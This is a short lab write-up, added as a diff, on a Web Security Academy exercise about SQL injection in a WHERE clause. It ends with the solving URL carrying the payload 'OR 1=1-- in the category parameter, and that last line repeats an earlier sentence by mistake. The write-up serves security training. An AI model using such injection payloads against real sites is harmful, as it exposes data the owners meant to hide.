@@ -1,0 +1,10 @@
+Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
+
+SQL query: `SELECT * FROM products WHERE category = 'Gifts' AND released = 1`
+
+Choosing a search topic modifies the url parameters, exanple for "pets": https://ac931fce1f5aeafdc0645a27003700d1.web-security-academy.net/filter?category=Pets
+
+This means that we can modify the sql query being executed via the url parameters
+
+
+Solved lab by typing the following into url: Choosing a search topic modifies the url parameters, exanple for "pets": https://ac931fce1f5aeafdc0645a27003700d1.web-security-academy.net/filter?category=Pets'OR 1=1--
